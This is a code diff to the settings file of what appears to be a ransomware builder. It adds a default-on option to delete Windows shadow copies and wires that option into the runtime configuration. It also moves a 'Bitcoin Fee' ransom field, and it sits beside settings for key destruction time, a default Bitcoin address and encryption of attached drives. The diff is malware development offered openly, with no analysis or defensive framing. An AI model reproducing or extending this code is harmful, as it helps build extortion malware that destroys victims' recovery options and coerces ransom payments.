@@ -138,18 +138,14 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
-        "bitcoin_fee", {
-            "label": "Bitcoin Fee",
-            "label_object_name": "BitcoinFeeLabel",
-            "input_object_name": "BitcoinFeeTextCtrl",
-            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
-            "example": "0.0897",
-            "input_requirement": "A valid integer or floating point number",
+        "delete_shadow_copies", {
+            "label": "Delete Shadow Copies",
+            "input_object_name": "DeleteShadowCopiesCheckbox",
             "config_area": "Ransomware Settings",
-            "validate": True,
-            "default": "1.0"
+            "validate": False,
+            "default": True
             }
-     ),
+    ),
     (
         "key_destruction_time", {
             "label": "Key Destruction Time(s)",
@@ -177,6 +173,19 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
             }
     ),
+    (
+        "bitcoin_fee", {
+            "label": "Bitcoin Fee",
+            "label_object_name": "BitcoinFeeLabel",
+            "input_object_name": "BitcoinFeeTextCtrl",
+            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
+            "example": "0.0897",
+            "input_requirement": "A valid integer or floating point number",
+            "config_area": "Ransomware Settings",
+            "validate": True,
+            "default": "1.0"
+            }
+     ),
     (
         "encrypt_attached_drives", {
             "label": "Encrypt Attached Drives",
@@ -316,7 +325,8 @@ RUNTIME_CONFIG_ITEMS = [
     "background_colour",
     "heading_font_colour",
     "primary_font_colour",
-    "secondary_font_colour"
+    "secondary_font_colour",
+    "delete_shadow_copies"
     ]
 
 RUNTIME_CONFIG_PATH = "Resources/runtime.cfg"
